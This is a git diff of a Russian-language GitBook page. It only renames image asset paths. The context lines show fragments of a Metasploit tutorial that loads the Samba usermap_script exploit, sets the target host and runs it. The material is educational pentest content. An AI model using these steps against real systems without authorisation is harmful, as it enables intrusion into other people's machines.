@@ -2,7 +2,7 @@
 
 ###
 
-![](<../.gitbook/assets/1 (1) (1) (1).png>)
+![](<../.gitbook/assets/1 (1) (1) (1) (1).png>)
 
 ### Содержание:
 
@@ -80,7 +80,7 @@ msf6 > use exploit/multi/samba/usermap_script
 
 Настраиваем так:
 
-![](<../.gitbook/assets/2 (1) (1).png>)
+![](<../.gitbook/assets/2 (1) (1) (1).png>)
 
 **RHOSTS** - удаленная машина, которую будем атаковать
 
@@ -98,4 +98,4 @@ $ ip r
 msf6 exploit(multi/samba/usermap_script) > exploit
 ```
 
-![](<../.gitbook/assets/3 (1).png>)
+![](<../.gitbook/assets/3 (1) (1).png>)
